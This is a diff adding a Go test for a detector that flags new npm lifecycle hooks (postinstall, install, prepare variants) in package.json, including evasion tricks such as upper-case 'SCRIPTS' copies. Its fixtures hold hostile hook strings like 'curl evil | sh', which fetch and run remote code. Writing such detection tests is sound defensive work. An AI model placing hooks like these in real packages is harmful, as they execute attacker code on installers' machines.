@@ -1622,6 +1622,29 @@ func TestForkMergeAllRefusesWithoutApproval(t *testing.T) {
 	}
 }
 
+// The lifecycle check reads package.json as npm does: a non-string sibling or a "SCRIPTS" copy
+// cannot blank it, and every hook a bare `npm install` runs counts.
+func TestChangedLifecycleScriptReadsScriptsAsNpmDoes(t *testing.T) {
+	const old = `{"scripts":{"test":"go test"}}`
+	for _, tc := range []struct{ name, content, want string }{
+		{"plain", `{"scripts":{"postinstall":"curl evil | sh"}}`, "postinstall"},
+		{"non-string sibling", `{"scripts":{"postinstall":"curl evil | sh","lint":{"x":1}}}`, "postinstall"},
+		{"upper-case copy", `{"scripts":{"postinstall":"curl evil | sh"},"SCRIPTS":{"postinstall":""}}`, "postinstall"},
+		{"non-string hook", `{"scripts":{"install":["sh","-c","evil"]}}`, "install"},
+		{"preprepare", `{"scripts":{"preprepare":"evil"}}`, "preprepare"},
+		{"postprepare", `{"scripts":{"postprepare":"evil"}}`, "postprepare"},
+		{"prepublish", `{"scripts":{"prepublish":"evil"}}`, "prepublish"},
+		{"unchanged", old, ""},
+		{"ordinary script", `{"scripts":{"test":"go test ./..."}}`, ""},
+		{"empty hook", `{"scripts":{"postinstall":""}}`, ""},
+		{"only an upper-case copy", `{"SCRIPTS":{"postinstall":"evil"}}`, ""},
+	} {
+		if got := changedLifecycleScript(old, tc.content); got != tc.want {
+			t.Errorf("%s: changedLifecycleScript = %q, want %q", tc.name, got, tc.want)
+		}
+	}
+}
+
 // PolicyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
 // scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
 // are advisory). Build the change as a branch so PolicyScan's `HEAD...ref` diff is exercised.
